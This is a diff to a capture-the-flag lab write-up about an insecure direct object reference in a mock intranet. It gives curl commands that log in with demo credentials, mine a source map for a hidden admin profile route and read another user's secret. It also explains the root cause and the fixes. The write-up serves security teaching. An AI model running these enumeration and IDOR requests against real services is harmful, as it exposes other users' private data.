@@ -2,79 +2,87 @@
 
 ## What Is Happening
 
-The [Acme Intranet lab](https://2060640a8540.pwnbox-lab.com/) logs in `demo/demo`, stores a signed session cookie containing `{"uid":42}`, and renders the signed-in user's profile from `/api/me`.
+Acme Intranet logs in `demo/demo`, stores a signed session cookie containing `{"uid":42}`, and renders the signed-in user's profile from a session-derived “me” endpoint.
 
-The challenge claims the user id is tied to the session and cannot be tampered with. That is true for `/api/me`, but a second endpoint still accepts a raw numeric user id and returns sensitive data.
+The challenge claims the user id is tied to the session and cannot be tampered with. That is true for the primary profile route, but a second (often dormant) endpoint still accepts a raw numeric user id and returns a sensitive `secret` field.
+
+Two packaging variants exist:
+
+| Variant | Client surface | IDOR endpoint |
+|---------|----------------|---------------|
+| Separate modules | `/js/team.js` comments | `GET /api/teamMemberInfo/<id>` |
+| Single esbuild bundle + public map | `/js/app.bundle.js` + `.map` | `GET /api/v1/admin/profile?principal=<id>` |
 
 ## Why It Happens
 
-`/api/me` derives the current user from the signed `session` cookie. Tampering the cookie or dropping `session.sig` returns `401`.
+The “me” route derives the current user from the signed `session` cookie. Tampering the cookie or dropping `session.sig` returns `401`.
 
-However, `/js/team.js` documents a dormant team-directory API:
-
-```text
-GET /api/teamMemberInfo/<numeric user id>
-→ { id, username, name, email, title, secret }
-```
-
-That endpoint performs no ownership check. Any authenticated user can request another member's record by changing the id in the URL.
+A dormant admin/team helper still documents an id-based lookup that returns `{ id, username, name, email, title, secret }` with no ownership check. Any authenticated user can request another member by changing the id.
 
 The dashboard announcement names **Mira (#1, admin)**, giving a high-value enumeration target.
 
 ## Exploit Chain
 
 1. Log in as `demo/demo`.
-2. Recon JavaScript bundles for alternate APIs that accept object ids.
-3. Request `GET /api/teamMemberInfo/1`.
-4. Read the `secret` field from the response.
+2. Recon JavaScript: separate modules **or** `app.bundle.js` + `app.bundle.js.map` `sourcesContent`.
+3. Call the dormant id-based profile endpoint with `principal`/`id` = `1`.
+4. Read the `secret` field.
 
 ## Exact Test
 
-Login and IDOR read:
+### Variant A — path id (`teamMemberInfo`)
 
 ```bash
-curl -sS -c /tmp/cj -X POST 'https://2060640a8540.pwnbox-lab.com/api/login' \
+curl -sS -c /tmp/cj -X POST 'https://[host]/api/login' \
   -H 'content-type: application/json' \
   -d '{"username":"demo","password":"demo"}'
 
-curl -sS -b /tmp/cj 'https://2060640a8540.pwnbox-lab.com/api/teamMemberInfo/1'
+curl -sS -b /tmp/cj 'https://[host]/api/teamMemberInfo/1'
+```
+
+### Variant B — source map + query `principal`
+
+```bash
+curl -sS -c /tmp/cj -X POST 'https://[host]/api/login' \
+  -H 'content-type: application/json' \
+  -d '{"username":"demo","password":"demo"}'
+
+curl -sS -b /tmp/cj 'https://[host]/js/app.bundle.js.map' \
+  | jq -r '.sourcesContent[]' | grep -n 'admin/profile\|principal\|secret'
+
+curl -sS -b /tmp/cj 'https://[host]/api/v1/user/me'
+curl -sS -b /tmp/cj 'https://[host]/api/v1/admin/profile?principal=1'
 ```
 
 Control — session-bound profile has no secret:
 
 ```bash
-curl -sS -b /tmp/cj 'https://2060640a8540.pwnbox-lab.com/api/me'
-```
-
-Control — session tampering fails:
-
-```bash
-curl -sS 'https://2060640a8540.pwnbox-lab.com/api/me' \
-  -H 'Cookie: session=eyJ1aWQiOjF9; session.sig=invalid'
+curl -sS -b /tmp/cj 'https://[host]/api/me'          # older instances
+curl -sS -b /tmp/cj 'https://[host]/api/v1/user/me'  # bundle instances
 ```
 
 ## Expected Signal
 
-- `/api/me` returns only the signed-in user's public profile fields.
-- `/api/teamMemberInfo/42` returns demo's record with a placeholder secret.
-- `/api/teamMemberInfo/1` returns admin data including the flag in `secret`.
-- Forged session cookies are rejected on `/api/me`.
+- “me” returns only the signed-in user's public profile fields.
+- Own id on the alternate endpoint returns a placeholder secret.
+- Id `1` (Mira) returns admin data including `pwnbox{...}` in `secret`.
+- Forged session cookies are rejected on the “me” route.
 
 ## Result Interpretation
 
-Confirmed bug chain:
-
 ```text
-Signed session protects /api/me
+Signed session protects /api/.../me
 -> developer assumes id cannot be abused
--> dormant /api/teamMemberInfo/:id accepts arbitrary ids
+-> dormant team/admin profile API accepts arbitrary ids
 -> no ownership check on alternate endpoint
 -> horizontal/vertical read of secret field
 ```
 
+Minifying into one bundle does **not** remove the bug if unused modules remain in the build and the source map (or comments) still document the route.
+
 ## Root Cause
 
-Authorization was implemented on one endpoint but not across all routes that reference user objects by id.
+Authorization was implemented on one endpoint but not across all routes that reference user objects by id (path or query).
 
 ## Impact
 
@@ -85,13 +93,18 @@ Authorization was implemented on one endpoint but not across all routes that ref
 
 - Enforce object-level authorization on every id-parameter endpoint.
 - Return sensitive fields only when `requested_id == session_user_id` or the caller has an explicit admin role.
-- Remove unused APIs from production bundles or protect them server-side.
+- Remove unused APIs from production bundles; disable public source maps.
 - Add regression tests for all object-reference routes, not only the main profile API.
 
 ## Key Lesson
 
-Securing the "main" profile route does not secure the application. If any endpoint still accepts a user-controlled id, test it for IDOR even when the developer claims ids are session-bound elsewhere.
+Securing the "main" profile route does not secure the application. If any endpoint still accepts a user-controlled id — including oddly named params like `principal` — test it for IDOR even when the developer claims ids are session-bound elsewhere. Always fetch `.js.map` next to minified bundles.
 
-## Flag
+## Confirmed Instances
 
-`pwnbox{4880226857ecdeb7a41ec5d664ddbd50}`
+| Date | Host | Variant | IDOR |
+|------|------|---------|------|
+| 2026-07-08 | `2060640a8540.pwnbox-lab.com` | separate `team.js` | `/api/teamMemberInfo/1` |
+| 2026-07-09 | `5f1d21017a49.pwnbox-lab.com` | `app.bundle.js.map` | `/api/v1/admin/profile?principal=1` |
+
+Live flags omitted from reusable notes; see dated `labs/` entries for instance work.
